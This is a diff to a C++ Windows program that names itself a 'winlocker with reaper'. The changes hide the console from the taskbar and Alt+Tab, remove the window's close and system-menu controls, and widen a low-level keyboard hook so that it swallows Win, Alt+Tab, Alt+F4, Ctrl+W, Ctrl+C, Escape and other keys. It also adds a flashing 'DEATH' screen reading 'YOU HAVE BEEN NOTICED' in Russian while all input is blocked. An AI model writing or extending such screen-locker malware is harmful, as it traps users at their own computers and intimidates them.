@@ -1,5 +1,5 @@
 // language: C++, file: werkaramel.cpp, target: Windows 11 x64, MSVC
-// werkaramel — Death + rules + menu + winlocker with reaper, locked cmd
+// werkaramel — Death rainbow + rules + menu + winlocker with reaper
 #include <windows.h>
 #include <string>
 #include <thread>
@@ -104,10 +104,16 @@ void SetupConsole() {
     wcscpy_s(cfi.FaceName, L"Consolas");
     SetCurrentConsoleFontEx(g_hOut, FALSE, &cfi);
 
-    // убираем кнопки: закрыть, свернуть, развернуть + системное меню + рамка
+    // УБИРАЕМ СТИЛИ ОКНА
     LONG style = GetWindowLong(g_hCon, GWL_STYLE);
     style &= ~(WS_MINIMIZEBOX | WS_MAXIMIZEBOX | WS_SYSMENU | WS_THICKFRAME);
     SetWindowLong(g_hCon, GWL_STYLE, style);
+
+    // убираем из панели задач и Alt+Tab
+    LONG exStyle = GetWindowLong(g_hCon, GWL_EXSTYLE);
+    exStyle |= WS_EX_TOOLWINDOW;
+    exStyle &= ~WS_EX_APPWINDOW;
+    SetWindowLong(g_hCon, GWL_EXSTYLE, exStyle);
 
     HMENU menu = GetSystemMenu(g_hCon, FALSE);
     if (menu) {
@@ -127,11 +133,26 @@ LRESULT CALLBACK BlockHook(int code, WPARAM wp, LPARAM lp) {
     if (code == HC_ACTION) {
         auto* kb = (KBDLLHOOKSTRUCT*)lp;
         DWORD vk = kb->vkCode;
+
         if (vk == VK_LWIN || vk == VK_RWIN) return 1;
-        if (vk == VK_TAB && (GetAsyncKeyState(VK_MENU) & 0x8000)) return 1;
-        if (vk == VK_F4 && (GetAsyncKeyState(VK_MENU) & 0x8000)) return 1;
+
+        if (GetAsyncKeyState(VK_MENU) & 0x8000) {
+            if (vk == VK_TAB) return 1;
+            if (vk == VK_F4) return 1;
+            if (vk == VK_ESCAPE) return 1;
+            if (vk == VK_SPACE) return 1;
+        }
+
+        if (GetAsyncKeyState(VK_CONTROL) & 0x8000) {
+            if (vk == 'W') return 1;
+            if (vk == 'Q') return 1;
+            if (vk == 'C') return 1;
+            if (vk == VK_PAUSE) return 1;
+        }
+
         if (vk == VK_ESCAPE) return 1;
         if (vk == VK_F11) return 1;
+        if (vk == VK_F12) return 1;
     }
     return CallNextHookEx(nullptr, code, wp, lp);
 }
@@ -142,14 +163,11 @@ LRESULT CALLBACK BlockAllHook(int code, WPARAM wp, LPARAM lp) {
 }
 
 // ═══════════════════════════════════════════════════════════
-// ФАЗА 1 — DEATH + ВАС ЗАМЕТИЛИ
+// ФАЗА 1 — DEATH РАДУГОЙ + ВАС ЗАМЕТИЛИ
 // ═══════════════════════════════════════════════════════════
 void PhaseRed() {
     g_kbHook = SetWindowsHookExW(WH_KEYBOARD_LL, BlockAllHook,
                                  GetModuleHandleW(nullptr), 0);
-
-    ClearScreen(0);
-    SetColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
 
     CONSOLE_SCREEN_BUFFER_INFO csbi;
     GetConsoleScreenBufferInfo(g_hOut, &csbi);
@@ -160,25 +178,52 @@ void PhaseRed() {
     int startY = (rows - lines - 4) / 2;
     if (startY < 1) startY = 1;
 
-    for (int i = 0; i < lines; ++i) {
-        int len = (int)wcslen(DEATH[i]);
-        int x = (cols - len) / 2;
-        if (x < 1) x = 1;
-        Gotoxy(x, startY + i);
-        WOut(DEATH[i]);
-    }
-
     std::wstring txt = L"В А С   З А М Е Т И Л И";
     int txtY = startY + lines + 2;
     if (txtY > rows - 1) txtY = rows - 1;
 
-    SetColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY);
-    int tx = (cols - (int)txt.size()) / 2;
-    if (tx < 1) tx = 1;
-    Gotoxy(tx, txtY);
-    WOut(txt);
+    WORD rainbow[] = {
+        FOREGROUND_RED | FOREGROUND_INTENSITY,
+        FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY,
+        FOREGROUND_GREEN | FOREGROUND_INTENSITY,
+        FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY,
+        FOREGROUND_BLUE | FOREGROUND_INTENSITY,
+        FOREGROUND_RED | FOREGROUND_BLUE | FOREGROUND_INTENSITY,
+        FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY,
+    };
+    int colorCount = sizeof(rainbow) / sizeof(rainbow[0]);
 
-    std::this_thread::sleep_for(std::chrono::seconds(3));
+    auto start = std::chrono::steady_clock::now();
+    int frame = 0;
+
+    while (true) {
+        auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(
+            std::chrono::steady_clock::now() - start).count();
+        if (elapsed >= 6) break;
+
+        ClearScreen(0);
+
+        SetColor(rainbow[frame % colorCount]);
+        for (int i = 0; i < lines; ++i) {
+            int len = (int)wcslen(DEATH[i]);
+            int x = (cols - len) / 2;
+            if (x < 1) x = 1;
+            Gotoxy(x, startY + i);
+            WOut(DEATH[i]);
+        }
+
+        WORD txtColor = (frame % 2 == 0)
+            ? (FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY)
+            : (FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
+        SetColor(txtColor);
+        int tx = (cols - (int)txt.size()) / 2;
+        if (tx < 1) tx = 1;
+        Gotoxy(tx, txtY);
+        WOut(txt);
+
+        std::this_thread::sleep_for(std::chrono::milliseconds(150));
+        frame++;
+    }
 
     UnhookWindowsHookEx(g_kbHook);
     g_kbHook = nullptr;
